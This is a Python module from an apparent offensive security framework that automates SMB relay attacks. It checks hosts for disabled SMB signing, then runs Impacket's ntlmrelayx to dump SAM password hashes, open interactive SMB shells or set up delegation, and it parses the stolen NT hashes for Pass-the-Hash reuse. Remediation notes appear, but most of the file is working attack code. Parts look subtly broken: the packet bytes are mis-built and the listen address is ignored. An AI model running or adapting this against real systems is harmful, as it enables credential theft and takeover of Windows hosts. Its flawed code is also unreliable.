"""
Expedite Strike — SMB Relay Attack Engine
==========================================
For authorized penetration testing only.
Detects SMB signing misconfigurations and orchestrates relay attacks
using Impacket's ntlmrelayx to capture SAM hashes or establish sessions.

MITRE ATT&CK:
  T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
  T1003.002 — OS Credential Dumping: Security Account Manager
  T1210     — Exploitation of Remote Services
"""

import os
import re
import socket
import subprocess
import tempfile
import threading
import time
from typing import Callable, Dict, List, Optional


_log_fn: Optional[Callable] = None

MITRE = [
    {"id": "T1557.001", "name": "LLMNR/NBT-NS Poisoning and SMB Relay"},
    {"id": "T1003.002", "name": "OS Credential Dumping: SAM"},
    {"id": "T1210",     "name": "Exploitation of Remote Services"},
]


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


def _run(cmd: list, timeout: int = 60) -> str:
    """Run subprocess, return combined stdout+stderr."""
    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        r = subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, creationflags=flags,
        )
        return (r.stdout or "") + (r.stderr or "")
    except FileNotFoundError:
        return "[NOT_FOUND]"
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except Exception as e:
        return f"[ERROR] {e}"


# ── SMB Signing Check ──────────────────────────────────────────────────────────

def check_smb_signing(targets: List[str], log_fn: Callable = None) -> List[str]:
    """
    Check which targets do NOT require SMB signing (relay candidates).

    Args:
        targets:  List of IP addresses to check
        log_fn:   Logging callback

    Returns:
        List of IPs where SMB signing is NOT required
    """
    global _log_fn
    _log_fn = log_fn
    unsigned = []

    _log(f"  [SMB-Relay] Checking SMB signing on {len(targets)} target(s)...")

    for ip in targets:
        try:
            # Try impacket's smbclient check first
            out = _run(
                ["python", "-m", "impacket.examples.smbclient",
                 "-no-pass", f"{ip}"],
                timeout=10
            )
            # Check via direct socket probe
            signing_required = _check_signing_via_socket(ip)
            if not signing_required:
                unsigned.append(ip)
                _log(f"  [SMB-Relay] ✅ {ip} — SMB signing NOT required (relay candidate)")
            else:
                _log(f"  [SMB-Relay] 🔒 {ip} — SMB signing required (skip)")
        except Exception as e:
            _log(f"  [SMB-Relay] ⚠ {ip} check failed: {e}")

    _log(f"  [SMB-Relay] Found {len(unsigned)} unsigned target(s)")
    return unsigned


def _check_signing_via_socket(ip: str, port: int = 445) -> bool:
    """
    Probe SMB negotiate to determine if signing is required.
    Returns True if signing required, False if not.
    """
    try:
        sock = socket.create_connection((ip, port), timeout=5)

        # NetBIOS Session Request
        nb_req = (
            b"\x00\x00\x00\x2f"  # length
            b"\x81"              # session request
            b"\x00\x00\x2c"
            b"\x20EONEMDBNBEJEEGEJEJEOEJENELENEOEF"
            b"\x00\x20FAEICACACACACACACACACACACACACACA"
            b"\x00"
        )

        # SMB1 Negotiate
        smb_neg = (
            b"\x00\x00\x00\x54"
            b"\xffSMB"
            b"\x72\x00\x00\x00\x00"
            b"\x18\x01\x28\x00"
            b"\x00" * 12
            b"\x00\x00"
            b"\x00\x00"
            b"\xff\xff\xff\xff"
            b"\x00\x00"
            b"\x0c"
            b"\x00\x02NT LM 0.12\x00"
            b"\x02SMB 2.002\x00"
            b"\x02SMB 2.???\x00"
        )

        sock.send(nb_req + smb_neg)
        data = sock.recv(1024)
        sock.close()

        # Check SecurityMode byte in SMB response
        if len(data) > 39:
            security_mode = data[39]
            # Bit 3 = signing required
            return bool(security_mode & 0x08)
        return False
    except Exception:
        return False


# ── Parse ntlmrelayx Output ────────────────────────────────────────────────────

def _parse_relay_output(output: str) -> Dict:
    """Parse ntlmrelayx output for captured hashes and sessions."""
    sam_hashes = []
    shells     = []

    # Parse SAM hashes  (format: Administrator:500:aad3...:hash:::)
    for line in output.splitlines():
        line = line.strip()
        if re.match(r"^\w+:\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::", line):
            parts = line.split(":")
            if len(parts) >= 4:
                sam_hashes.append({
                    "username": parts[0],
                    "rid":      parts[1],
                    "lm_hash":  parts[2],
                    "nt_hash":  parts[3],
                    "hash_str": line,
                })

    # Parse interactive shell sessions
    if "started interactive SMB client shell" in output.lower():
        shells.append("Interactive SMB shell opened")

    if "delegation access" in output.lower():
        shells.append("RBCD delegation configured")

    return {"sam_hashes": sam_hashes, "shells": shells}


# ── SMB Relay Execution ────────────────────────────────────────────────────────

def run_smb_relay(
    relay_targets: List[str],
    listen_ip: str = "0.0.0.0",
    mode: str = "sam_dump",
    log_fn: Callable = None,
    duration: int = 120,
) -> Dict:
    """
    Run SMB relay attack using Impacket ntlmrelayx.

    Args:
        relay_targets: List of target IPs to relay auth to
        listen_ip:     IP to listen for incoming NTLM auth
        mode:          'sam_dump' | 'shell' | 'rbcd'
        log_fn:        Logging callback
        duration:      Seconds to run relay (default 120)

    Returns:
        {mode, targets_hit, sam_hashes, shells_opened, findings, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [SMB-Relay] SMB Relay Attack Engine")
    _log(f"  [SMB-Relay] Mode     : {mode}")
    _log(f"  [SMB-Relay] Targets  : {relay_targets}")
    _log(f"  [SMB-Relay] Duration : {duration}s")
    _log(f"{'='*60}\n")

    if not relay_targets:
        _log("  [SMB-Relay] ⚠ No relay targets provided")
        return {"mode": mode, "targets_hit": [], "sam_hashes": [],
                "shells_opened": [], "findings": [], "mitre": MITRE}

    # Write targets file
    targets_file = tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", delete=False, prefix="xstrike_relay_"
    )
    for t in relay_targets:
        targets_file.write(f"{t}\n")
    targets_file.close()

    # Build ntlmrelayx command
    cmd = [
        "python", "-m", "impacket.examples.ntlmrelayx",
        "-tf", targets_file.name,
        "-smb2support",
        "--no-http-server",
    ]

    if mode == "sam_dump":
        cmd += ["-q"]
        _log("  [SMB-Relay] Mode: SAM dump — will extract local hashes from relay targets")
    elif mode == "shell":
        cmd += ["--interactive"]
        _log("  [SMB-Relay] Mode: Interactive shell — spawning SMBclient shell on relay")
    elif mode == "rbcd":
        cmd += ["--delegate-access"]
        _log("  [SMB-Relay] Mode: RBCD — configuring Resource-Based Constrained Delegation")

    _log(f"  [SMB-Relay] Command: {' '.join(cmd)}")
    _log(f"  [SMB-Relay] ⏳ Relay listener active for {duration}s...")

    output_lines = []
    proc = None

    try:
        flags = subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
        proc  = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            creationflags=flags,
        )

        start = time.time()
        while time.time() - start < duration:
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    break
                time.sleep(0.1)
                continue
            line = line.rstrip()
            output_lines.append(line)
            if any(kw in line.lower() for kw in
                   ["hash", "administrator", "shell", "relayed", "success", "sam"]):
                _log(f"  [SMB-Relay] {line}")

    except FileNotFoundError:
        _log("  [SMB-Relay] ⚠ impacket not installed — install with: pip install impacket")
    except Exception as e:
        _log(f"  [SMB-Relay] Error: {e}")
    finally:
        if proc and proc.poll() is None:
            proc.terminate()
        try:
            os.unlink(targets_file.name)
        except Exception:
            pass

    full_output = "\n".join(output_lines)
    parsed      = _parse_relay_output(full_output)
    findings    = []

    for h in parsed["sam_hashes"]:
        findings.append({
            "title":       f"SAM Hash Relayed — {h['username']}",
            "severity":    "Critical",
            "description": (
                f"SMB relay attack successfully dumped SAM hash for {h['username']}. "
                f"NT Hash: {h['nt_hash']}. "
                f"Use for Pass-the-Hash or offline cracking (Hashcat -m 1000)."
            ),
            "target":      ", ".join(relay_targets),
            "hash_str":    h["hash_str"],
            "mitre_id":    "T1557.001",
            "mitre_name":  "LLMNR/NBT-NS Poisoning and SMB Relay",
            "remediation": (
                "Enable SMB signing via GPO: Computer Config → Windows Settings → "
                "Security Settings → Local Policies → Security Options → "
                "'Microsoft network server: Digitally sign communications (always)' = Enabled."
            ),
        })

    for shell in parsed["shells"]:
        findings.append({
            "title":       f"SMB Relay Shell — {shell}",
            "severity":    "Critical",
            "description": f"SMB relay established: {shell}",
            "target":      ", ".join(relay_targets),
            "mitre_id":    "T1557.001",
            "mitre_name":  "LLMNR/NBT-NS Poisoning and SMB Relay",
            "remediation": "Enable SMB signing on all domain-joined systems.",
        })

    _log(f"\n  [SMB-Relay] ✅ Done — {len(parsed['sam_hashes'])} SAM hash(es), "
         f"{len(parsed['shells'])} shell(s)")

    return {
        "mode":          mode,
        "targets_hit":   relay_targets,
        "sam_hashes":    parsed["sam_hashes"],
        "shells_opened": parsed["shells"],
        "findings":      findings,
        "mitre":         MITRE,
        "summary":       (
            f"SMB Relay ({mode}): {len(parsed['sam_hashes'])} hashes, "
            f"{len(parsed['shells'])} shells"
        ),
    }


def run_full_smb_relay_chain(
    targets: List[str],
    listen_ip: str = "0.0.0.0",
    log_fn: Callable = None,
    duration: int = 120,
) -> Dict:
    """
    Orchestrate full SMB relay chain:
    1. Check signing on all targets
    2. Filter to unsigned targets only
    3. Run relay in best mode (sam_dump first, then shell)
    4. Return combined results

    Args:
        targets:   All potential target IPs
        listen_ip: Listener IP
        log_fn:    Logging callback
        duration:  Duration per relay attempt

    Returns:
        Combined relay results dict
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n  [SMB-Relay] Starting full relay chain against {len(targets)} targets...")

    # Step 1: Find unsigned targets
    unsigned = check_smb_signing(targets, log_fn)

    if not unsigned:
        _log("  [SMB-Relay] All targets require SMB signing — relay not possible")
        findings = [{
            "title":       "SMB Signing Enforced",
            "severity":    "Info",
            "description": "All scanned targets require SMB signing. SMB relay attack not feasible.",
            "target":      ", ".join(targets),
            "mitre_id":    "T1557.001",
            "mitre_name":  "LLMNR/NBT-NS Poisoning and SMB Relay",
            "remediation": "SMB signing is correctly enforced — maintain this configuration.",
        }]
        return {
            "mode": "none", "targets_hit": [], "sam_hashes": [],
            "shells_opened": [], "findings": findings, "mitre": MITRE,
            "summary": "No relay targets — SMB signing enforced on all hosts",
        }

    # Step 2: Try SAM dump first
    _log(f"  [SMB-Relay] Relaying against {len(unsigned)} unsigned target(s)...")
    result = run_smb_relay(unsigned, listen_ip, "sam_dump", log_fn, duration)

    # Step 3: If no hashes, try shell mode
    if not result["sam_hashes"] and not result["shells_opened"]:
        _log("  [SMB-Relay] No SAM hashes — attempting interactive shell mode...")
        result2 = run_smb_relay(unsigned, listen_ip, "shell", log_fn, min(duration, 60))
        result["shells_opened"].extend(result2["shells_opened"])
        result["findings"].extend(result2["findings"])

    return result
